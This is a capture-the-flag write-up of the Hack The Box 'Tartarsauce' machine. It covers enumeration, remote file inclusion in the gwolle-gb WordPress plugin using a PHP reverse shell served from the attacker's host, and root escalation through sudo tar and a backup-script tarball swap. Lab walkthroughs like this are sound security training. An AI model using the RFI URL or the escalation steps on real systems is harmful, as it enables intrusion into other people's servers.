# HTB: Tartersauce Writeup w/o Metasploit
!![tartarsauce](https://user-images.githubusercontent.com/48168337/178492785-2127e6a5-eb5a-4e29-8e75-85433288b32f.jpg)


## Introduction
As always, we are going to start this box off with some nmap scans. 

![nmap_80](https://user-images.githubusercontent.com/48168337/178493633-a762121d-4262-476c-9203-0bc995c52f69.JPG)
(*nmap -n -Pn 10.10.10.88 open -oN basic-10.10.10.88*)

A basic nmap scan shows us port 80 is open. If you're not familiar, port 80 is a protocol used for web services, it's also unencrypted. Before taking a look at 10.10.10.88 from a web browser, I added it to my host file as *tartarsauce.htb*, you'll see that in the image below.

![hosts](https://user-images.githubusercontent.com/48168337/178494584-f82fbccf-d052-4d88-8cbd-fee61531709c.png)

As you can see, there isn't much here on the web page but a bottle of tartarsauce. 

![webpage](https://user-images.githubusercontent.com/48168337/178494933-163db970-3bf5-44b3-8c80-c1c27da67d90.png)

What next? Well, we can always go back and run specific nmap scans. But before doing that lets use gobuster, a web directory scanner. Why gobuster? We know 10.10.10.88 is a web server and web servers tend to have other directories hosting different content. Gobuster will show other directories that may be available.

![gobuster01](https://user-images.githubusercontent.com/48168337/178496201-29e9a01c-611a-4003-8ecb-1ef93e2a77ad.png)

Gobuster reveals another directory named *webservices*. I tried to access it but kept getting "permission denied." Let’s run gobuster again but this time against the webservices directory (*10.10.10.88/webservices*).

![image](https://user-images.githubusercontent.com/48168337/178737208-c1b563c1-7d00-4046-92c8-3364c66468cb.png)

Looks like WordPress is running on this box. Gobuster returns a WordPress (*wp*) directory. 

![image](https://user-images.githubusercontent.com/48168337/178737359-d3dbd1c4-dd8a-4b16-b9f6-6c5027bb76fe.png)

There wasn't really much information here on this web page. So, what we did next was run a WordPress scan to look for common vulnerabilities. Kali comes with a WordPress scanner called *wpscan*, it's pretty simple and straightforward to use. 

I used this command (*wpscan --url http://10.10.10.88/webservices/wp/ -e ap --plugins-detection aggressive*) to run the WordPress scan.

Out of all the wpscan results. The most interesting was the *gwolle-gb* plugin. 

![wpscan](https://user-images.githubusercontent.com/48168337/178739809-cae0dbde-428e-4fd6-a707-c3f7e16ae847.png)

Further research shows that the plugin has a remote file inclusion vulnerability. 

![searchsploit](https://user-images.githubusercontent.com/48168337/178740548-c7364d2c-db4e-44fd-8418-154cf49d5396.png)

![rfi](https://user-images.githubusercontent.com/48168337/178740898-97f2d0dc-7d0c-46fd-8f5a-5edaccd16254.png)

All we need to do to exploit the RFI vulnerability, is (1) Create a php reverse shell (we copied it from a default location, check screenshot below). (2) Rename it to wp-load.php. (3) Change the IP and Port information within the script to your IP and listening port. (4) Start up a netcat listener (5) Start up a webserver that's hosting our wp-load.php file. (6) Execute this url (*http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.3:8000/*) from a web browser. Before executing it, make sure you change the 10.10.14.3:8000 to your IP and port number you're hosting your web service on. 

![steps-to-rfi](https://user-images.githubusercontent.com/48168337/178742794-c1facde0-c907-44e1-827c-498b8628e5f4.png)

![initial-shell](https://user-images.githubusercontent.com/48168337/178743318-6e355803-c968-45e8-884e-0e0257ec892b.png)

Boom, we successfully exploited the RFI vulnerability. Now, how do we escalate our privileges to root? One of the first things to check on a Linux box are sudo permissions. Running <mark > sudo -l</mark>. 

![sudo -l](https://user-images.githubusercontent.com/48168337/178985751-6ce3c8f3-61e0-4003-83f4-47915dbc7075.png)

After running it, you'll notice the user *onuma* can run /bin/tar as root. And we can exploit this, using [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), to break out of our current shell into one as onuma.

![gtfobins](https://user-images.githubusercontent.com/48168337/178985995-d65f6f17-3f8f-4d9d-b52b-ff35fa740bc8.png)

![sudo tar](https://user-images.githubusercontent.com/48168337/178986616-bbddc440-e788-442c-be8d-1c5e91c03634.png)

Now we have a shell as *onuma*. How do we escalate our privileges now? Well, after running linuenum.sh to find vulnerabilities/misconfigurations we found a script called <mark> /usr/sbin/backuperer</mark>. This script appears to be using onuma's sudo powers to tar up content within /var/www/html into /var/tmp. Its tarring it up under a random file name and then extracting it to a directory named check. Also, the script runs every 5 minutes. To exploit this, we have to create a directory structure similar to what the script is looking for, within that directory will be our payload. We will tar it up, set suid permissions on the file, and transfer it to our target machine. When the script creates the random tarred file, we will copy our tarred payload over the tarred file. The script will then take our tarred payload and extract it into the check directory it creates. Please make sure to watch our video walkthrough so you can actually see this in action. 

Below is a screenshot of me creating and tarring up the exploit locally on my kali machine.

![exploit](https://user-images.githubusercontent.com/48168337/178989727-29682bf8-d8d4-4f50-b0a6-98dd98136019.png)

I then transferred the file using netcat to my victim machine. FYI: I changed the name of the file.

![transfer-file](https://user-images.githubusercontent.com/48168337/178990051-f856a556-4967-470a-a674-bfdebf669cfd.png)

![retrieve-file](https://user-images.githubusercontent.com/48168337/178990570-c5cfbb93-ac26-465b-a4f4-a8234592d19a.png)

Now that my tarred file is on the victim box, I have to wait 5 minutes for the script to create the random tarred file that it will try to extract into directory named check.

Below you'll see us copy our tar file over the random file name that was created by the script.
![copy exploit](https://user-images.githubusercontent.com/48168337/178991491-85eb2bfd-ee8b-4d36-8371-ec3a49f34cef.png)

Now you'll see the check directory that was created. Keep in mind, our exploit was extracted into this directory.
![check-dir](https://user-images.githubusercontent.com/48168337/178991550-ab822e58-3a35-472b-bf28-65126775d4d0.png)

And boom! Our exploit is within the check directory. After executing it, we have a shell as root.
![root-shell](https://user-images.githubusercontent.com/48168337/178991878-72f1d9a8-fb60-46a0-a9a8-0dce15226852.png)

Tartarsauce was a cool box to play with. Personally, the level of difficulty depends on your scripting skills and experience. Depending on how familiar you were with bash scripts, this box could have been straightforward or really difficult. Hopefully, you enjoyed this writeup. Here is a link to the video walkthrough.
